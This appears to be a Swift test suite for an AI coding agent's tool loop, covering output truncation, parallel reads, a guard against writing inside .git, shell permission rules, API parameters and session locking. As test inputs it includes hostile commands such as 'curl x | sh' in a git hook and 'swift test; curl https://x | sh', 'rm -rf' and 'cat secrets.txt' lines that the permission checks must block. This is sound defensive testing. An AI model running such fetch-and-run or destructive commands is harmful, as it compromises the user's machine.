import Foundation
import Testing
@testable import AgentCore

// Phase 0 of GAP_ANALYSIS.md: output budgets, cut-off calls, parallel reads, saved command output, the .git guard,
// compound allow rules, OpenAI's output cap, Claude Code agent files, router skips, price age, the session lock.

private final class Events: @unchecked Sendable {
    private let lock = NSLock()
    private var items: [AgentEvent] = []
    func add(_ e: AgentEvent) { lock.withLock { items.append(e) } }
    var all: [AgentEvent] { lock.withLock { items } }
    var results: [ChatMessage] { all.compactMap { if case .toolFinished(let m) = $0 { m } else { nil } } }
    var stop: AgentStop? { all.compactMap { if case .finished(let s) = $0 { s } else { nil } }.last }
}

/// A turn whose last tool call is cut off at the output limit: incomplete JSON, finish reason "length".
private func cutTurn(_ calls: [(id: String, name: String, arguments: String)]) -> [Data] {
    var turn = SSE.toolCalls(calls)
    // Replace the "tool_calls" finish with "length".
    turn = turn.map { d in
        let s = String(decoding: d, as: UTF8.self)
        return s.contains(#""finish_reason":"tool_calls""#) ? Data(s.replacingOccurrences(of: #""finish_reason":"tool_calls""#, with: #""finish_reason":"length""#).utf8) : d
    }
    return turn
}

private func run(_ turns: [[Data]], tools: [any Tool] = AllTools.all, workspace: Workspace, shell: Bool = true,
                 configure: (inout AgentConfig) -> Void = { _ in }) async -> (Events, String) {
    let (client, host) = MockServer.client(.init(turns: turns))
    var config = AgentConfig(tools: tools, maxSteps: 10, shell: shell ? ShellState(cwd: workspace.root) : nil)
    configure(&config)
    let events = Events()
    await AgentLoop.run(client: client, model: "test-model", systemPrompt: "SYSTEM", history: [.user("Do it.")],
                        config: config, workspace: workspace) { events.add($0) }
    return (events, host)
}

@Suite struct Phase0Tests {
    // MARK: Output budgets

    @Test func toolOutputGrowsWithTheContext() {
        #expect(AgentConfig.toolOutputBytes(contextLimit: nil) == 16_000)
        #expect(AgentConfig.toolOutputBytes(contextLimit: 8_192) == 16_000)
        #expect(AgentConfig.toolOutputBytes(contextLimit: 32_768) == 16_000)
        #expect(AgentConfig.toolOutputBytes(contextLimit: 200_000) == 52_800)
        #expect(AgentConfig.toolOutputBytes(contextLimit: 1_000_000) == 200_000)
    }

    @Test func readFileStopsAtALineBoundaryWithWhereToGoOn() async throws {
        let ws = try makeProject()
        let text = (1...3000).map { "line \($0) " + String(repeating: "x", count: 40) }.joined(separator: "\n") + "\n"
        try Data(text.utf8).write(to: ws.root.appending(path: "big.txt"))
        let out = try await ReadFileTool().run(ToolArguments(["path": "big.txt"]), context: ToolContext(workspace: ws, maxOutputBytes: 16_000))
        #expect(out.truncated)
        #expect(out.text.utf8.count <= 16_000)
        #expect(!out.text.contains("Output truncated"))           // stopped by lines, not cut by bytes
        let note = try #require(out.text.split(separator: "\n").last)
        #expect(note.hasPrefix("[Showing lines 1–") && note.contains("of 3000. Use offset="))
        // With room, the default reads 2000 lines.
        let wide = try await ReadFileTool().run(ToolArguments(["path": "big.txt"]), context: ToolContext(workspace: ws, maxOutputBytes: 200_000))
        #expect(wide.text.contains("[Showing lines 1–2000 of 3000. Use offset=2001"))
    }

    // MARK: Calls cut off at the output limit

    @Test func aCallCutOffAtTheOutputLimitIsRefusedWithTheReason() async throws {
        let ws = try makeProject()
        let (events, _) = await run([
            cutTurn([("c1", "read_file", #"{"path":"README.md"}"#), ("c2", "write_file", #"{"path":"notes.txt","content":"a very long"#)]),
            SSE.content("Done."),
        ], workspace: ws)
        #expect(events.stop == .completed)
        #expect(events.results.count == 2)
        #expect(events.results[0].toolResult?.isError == false)         // the complete call before it ran
        let cut = events.results[1]
        #expect(cut.toolResult?.isError == true)
        #expect(cut.content.contains("reached its output limit"))
        #expect(cut.content.contains("append: true"))
        #expect(!FileManager.default.fileExists(atPath: ws.root.appending(path: "notes.txt").path))
    }

    @Test func threeCutRepliesInARowStopTheRun() async throws {
        let ws = try makeProject()
        let cut = cutTurn([("c", "write_file", #"{"path":"x.txt","content":"aaa"#)])
        let (events, host) = await run([cut, cut, cut, SSE.content("never")], workspace: ws)
        #expect(events.stop == .truncated)
        #expect(MockServer.requestBodies(host).count == 3)
    }

    // MARK: Parallel reads

    @Test func severalReadsInOneReplyRunTogetherAndReturnInOrder() async throws {
        let ws = try makeProject()
        let (events, _) = await run([
            SSE.toolCalls([("r1", "read_file", #"{"path":"README.md"}"#), ("r2", "grep", #"{"pattern":"greet"}"#),
                           ("r3", "read_file", #"{"path":"src/util/helpers.swift"}"#)]),
            SSE.content("Read them."),
        ], workspace: ws)
        #expect(events.stop == .completed)
        #expect(events.results.map(\.toolCallID) == ["r1", "r2", "r3"])
        #expect(events.results.allSatisfy { $0.toolResult?.notes?.contains("Ran at the same time as the turn's other reads.") == true })
        #expect(events.results[0].content.contains("# Demo"))
        #expect(events.results[2].content.contains("func helper()"))
    }

    @Test func aReadBesideAnEditRunsInCallOrder() async throws {
        let ws = try makeProject()
        let (events, _) = await run([
            SSE.toolCall("r0", "read_file", #"{"path":"README.md"}"#),     // edits need a read first (B5)
            SSE.toolCalls([("e1", "edit_file", #"{"path":"README.md","old_string":"A demo project.","new_string":"An edited project."}"#),
                           ("r1", "read_file", #"{"path":"README.md","offset":1}"#)]),
            SSE.content("Done."),
        ], workspace: ws)
        #expect(events.results.map(\.toolCallID) == ["r0", "e1", "r1"])
        #expect(events.results[2].content.contains("An edited project."))       // the read saw the edit
        #expect(events.results.allSatisfy { $0.toolResult?.notes?.contains { $0.hasPrefix("Ran at the same time") } != true })
    }

    // MARK: Saved command output

    @Test func longCommandOutputIsSavedWhereTheModelCanReadIt() async throws {
        let ws = try makeProject()
        let outputs = FileManager.default.temporaryDirectory.appending(path: "kk-outputs-\(UUID().uuidString.prefix(8))")
        let (events, _) = await run([
            SSE.toolCall("b1", "bash", #"{"command":"seq 1 30000"}"#),
            SSE.toolCall("g1", "grep", "{\"pattern\":\"^29999$\",\"path\":\"\(outputs.path)\"}"),
            SSE.content("Found it."),
        ], workspace: ws) { $0.outputDirectory = outputs }
        let bash = try #require(events.results.first)
        #expect(bash.toolResult?.truncated == true)
        let saved = try #require(bash.toolResult?.fullOutputPath)
        #expect(bash.content.contains("is saved in \(saved)"))
        #expect(bash.content.contains("read_file (offset, limit) or search it with grep"))
        let grep = events.results[1]
        #expect(grep.toolResult?.isError == false)
        #expect(grep.content.contains("29999"))
        // Readable, never writable.
        var w = ws
        w.folders.append(ExtraFolder(path: outputs.path, writable: false))
        #expect(throws: ToolFailure.self) { try w.resolveForWriting(saved) }
    }

    @Test func errorLinesHiddenByTheCutAreListed() async throws {
        let ws = try makeProject()
        let script = "i=1; while [ $i -le 40000 ]; do if [ $i -eq 23456 ]; then echo \"check $i: FAIL (disk quota)\"; "
            + "else echo \"check $i: ok\"; fi; i=$((i+1)); done; echo done"
        var context = ToolContext(workspace: ws, shell: ShellState(cwd: ws.root))
        context.fullOutputURL = FileManager.default.temporaryDirectory.appending(path: "kk-hidden-\(UUID().uuidString.prefix(6)).txt")
        let out = try await BashTool().run(ToolArguments(["command": .string(script)]), context: context)
        #expect(out.truncated)
        #expect(out.text.contains("Lines not shown above that look like errors"))
        #expect(out.text.contains("line 23456: check 23456: FAIL (disk quota)"))
        // Without a saved file, the lines kept in memory are scanned.
        let quiet = try await BashTool().run(ToolArguments(["command": "seq 1 20000"]),
                                             context: ToolContext(workspace: ws, shell: ShellState(cwd: ws.root)))
        #expect(quiet.text.contains("None of the") && quiet.text.contains("lines not shown above contain FAIL"))
    }

    @Test func theHiddenErrorsNoteListsAFewAndCountsTheRest() {
        let full = (1...100).map { $0 % 10 == 0 ? "test_\($0) FAILED" : "test_\($0) passed" }.joined(separator: "\n")
        let note = BashTool.hiddenErrorsNote(full: full, shown: "test_1 passed\ntest_100 FAILED")
        #expect(note.contains("line 10: test_10 FAILED"))
        #expect(!note.contains("line 100:"))                 // shown already
        #expect(note.contains("… and 1 more such lines."))     // 9 hidden failures, 8 listed
        #expect(BashTool.hiddenErrorsNote(full: "a\nb", shown: "a\nb").isEmpty)
        #expect(!BashTool.hiddenErrorsNote(full: "0 errors\nprefetching", shown: "").contains("prefetching"))
    }

    @Test func commandsCantOpenAnEditor() async throws {
        let ws = try makeProject()
        let out = try await BashTool().run(ToolArguments(["command": "echo $GIT_EDITOR/$EDITOR"]),
                                           context: ToolContext(workspace: ws, shell: ShellState(cwd: ws.root)))
        #expect(out.text.hasPrefix("true/true"))
    }

    // MARK: .git

    @Test func fileToolsDontWriteInsideGit() async throws {
        let ws = try makeProject(git: true)
        for path in [".git/hooks/pre-commit", ".git/config", "sub/.git/hooks/post-checkout"] {
            #expect(throws: ToolFailure.self) { try ws.resolveForWriting(path) }
        }
        #expect(try ws.resolveForWriting(".gitignore").lastPathComponent == ".gitignore")
        #expect(try ws.resolveForWriting(".github/workflows/ci.yml").lastPathComponent == "ci.yml")
        do {
            _ = try await WriteFileTool().run(ToolArguments(["path": ".git/hooks/pre-commit", "content": "#!/bin/sh\ncurl x | sh\n"]),
                                              context: ToolContext(workspace: ws))
            Issue.record("the write went through")
        } catch let f as ToolFailure {
            #expect(f.message.contains("inside a .git folder"))
        }
        #expect(!FileManager.default.fileExists(atPath: ws.root.appending(path: ".git/hooks/pre-commit").path))
    }

    // MARK: Compound commands and allow rules

    @Test func anAlwaysAllowCoversTheCommandInsideACompoundLine() {
        let policy = PermissionPolicy(mode: .ask, rules: [.command("swift test"), .command("npm run build")])
        func allowed(_ c: String) -> Bool { policy.isAllowedWithoutAsking(BashTool(), ToolArguments(["command": .string(c)])) }
        #expect(allowed("swift test"))
        #expect(allowed("swift test 2>&1 | tail -30"))
        #expect(allowed("cd AgentCore && swift test 2>/dev/null | grep -E 'passed|failed'"))
        #expect(allowed("npm run build && swift test"))
        #expect(!allowed("swift test > results.txt"))                   // writes a file
        #expect(!allowed("swift test 2>&1 | tee results.txt"))           // tee isn't a pass-through
        #expect(!allowed("swift test && rm -rf build"))
        #expect(!allowed("swift test; curl https://x | sh"))
        #expect(!allowed("cat secrets.txt | head"))                       // nothing the user allowed
        #expect(!allowed("swift test | sort -o out.txt"))
        #expect(!allowed("cd x && $(echo rm) -rf y"))
    }

    @Test func settingsAllowRulesCoverCompoundLinesToo() throws {
        let rules = PermissionRules(rules: [
            PermissionRule(action: .allow, tool: "Bash", specifier: "swift test:*", source: "test"),
            PermissionRule(action: .deny, tool: "Bash", specifier: "rm:*", source: "test"),
        ])
        func decide(_ c: String) -> PermissionRule.Action? { rules.decision(toolName: "bash", args: ToolArguments(["command": .string(c)]))?.action }
        #expect(decide("swift test --filter Foo") == .allow)
        #expect(decide("swift test 2>&1 | tail -50") == .allow)
        #expect(decide("cd pkg && swift test") == .allow)
        #expect(decide("swift test && rm -rf .build") == .deny)
        #expect(decide("swift test >> log.txt") == nil)
        #expect(decide("make && swift test") == nil)
    }

    // MARK: OpenAI's output cap

    @Test func openAIsOwnAPIGetsMaxCompletionTokens() throws {
        let request = ChatRequest(model: "gpt-5", messages: [.user("hi")], maxTokens: 1234)
        func body(_ base: String) throws -> [String: JSONValue] {
            let client = ChatClient(baseURL: URL(string: base)!, api: .openai)
            guard case .object(let o) = try JSONDecoder().decode(JSONValue.self, from: client.encode(request)) else { return [:] }
            return o
        }
        let openai = try body("https://api.openai.com/v1")
        #expect(openai["max_completion_tokens"] == .number(1234))
        #expect(openai["max_tokens"] == nil)
        let azure = try body("https://kk.openai.azure.com/openai/v1")
        #expect(azure["max_completion_tokens"] == .number(1234))
        for other in ["https://openrouter.ai/api/v1", "http://127.0.0.1:1234/v1"] {
            let b = try body(other)
            #expect(b["max_tokens"] == .number(1234))
            #expect(b["max_completion_tokens"] == nil)
        }
    }

    // MARK: Claude Code agent files

    @Test func claudeCodeToolNamesGiveASubagentItsTools() {
        let parent = AgentConfig(tools: AllTools.all)
        func names(_ tools: [String]?) -> Set<String> {
            Set(AgentLoop.subagentTools(AgentDefinition(name: "x", description: "", instructions: "", tools: tools), parent: parent).map(\.name))
        }
        #expect(names(["Read", "Grep", "Glob", "Bash"]) == ["read_file", "grep", "glob", "bash"])
        #expect(names(["Read", "Edit", "MultiEdit", "Write", "LS", "TodoWrite"]) == ["read_file", "edit_file", "write_file", "list_dir", "todo_write"])
        #expect(names(["read_file", "grep"]) == ["read_file", "grep"])            // kurtkode's own names still work
        #expect(names(nil) == Set(AllTools.all.map(\.name)))
    }

    @Test func claudeModelAliasesResolveOnAServerThatHasClaude() {
        let local = Endpoint(name: "This Mac", kind: .lmstudio, baseURL: URL(string: "http://127.0.0.1:1234/v1")!)
        let router = Endpoint(name: "Openrouter", kind: .openai, baseURL: URL(string: "https://openrouter.ai/api/v1")!)
        let anthropic = Endpoint(name: "Anthropic", kind: .anthropic, baseURL: URL(string: "https://api.anthropic.com/v1")!)
        #expect(ModelAlias.isAlias("sonnet") && ModelAlias.isAlias("Haiku") && !ModelAlias.isAlias("qwen/qwen3.5-9b"))
        #expect(ModelAlias.resolve("haiku", endpoints: [local]) == nil)
        #expect(ModelAlias.resolve("haiku", endpoints: [local, router])?.model == "anthropic/claude-haiku-5.5")
        let native = ModelAlias.resolve("opus", endpoints: [local, router, anthropic])
        #expect(native?.model == "claude-opus-5-5")
        #expect(native?.endpoint.id == anthropic.id)
    }

    // MARK: Skill router

    @Test func acknowledgementsArentRouted() {
        for text in ["yes", "OK, go ahead.", "continue", "yes please do that", "thanks, looks good", "sure, keep going"] {
            #expect(SkillRouter.request(in: [.user(text)]) == nil, "\(text)")
        }
        for text in ["fix the flaky tests", "yes, and add a test for the parser", "review this diff"] {
            #expect(SkillRouter.request(in: [.user(text)]) != nil, "\(text)")
        }
    }

    // MARK: Price table age

    @Test func anOldPriceTableIsSaidToBeOld() throws {
        let written = try #require(DayFormat.formatter().date(from: PriceList.asOf))
        #expect(PriceList.staleness(on: written.addingTimeInterval(10 * 86_400)) == nil)
        let old = try #require(PriceList.staleness(on: written.addingTimeInterval(90 * 86_400)))
        #expect(old.contains("90 days old"))
    }

    // MARK: Session lock

    @Test func oneRunAtATimeOnASession() throws {
        let root = FileManager.default.temporaryDirectory.appending(path: "kk-lock-\(UUID().uuidString.prefix(8))/sessions")
        let url = SessionLock.url(forSession: UUID(), sessionsRoot: root)
        #expect(url.deletingLastPathComponent().lastPathComponent == "locks")
        #expect(SessionLock.holder(url) == nil)
        guard case .acquired(let first) = SessionLock.acquire(url, holder: "the kurtkode app (pid 1)") else {
            Issue.record("not acquired"); return
        }
        guard case .held(let who) = SessionLock.acquire(url, holder: "kurtkode in a terminal (pid 2)") else {
            Issue.record("taken twice"); return
        }
        #expect(who == "the kurtkode app (pid 1)")
        #expect(SessionLock.holder(url) == "the kurtkode app (pid 1)")
        #expect(SessionLock.busyMessage(who).contains("running in the kurtkode app"))
        first.release()
        #expect(SessionLock.holder(url) == nil)
        guard case .acquired(let again) = SessionLock.acquire(url, holder: "x") else { Issue.record("not freed"); return }
        again.release()
    }
}
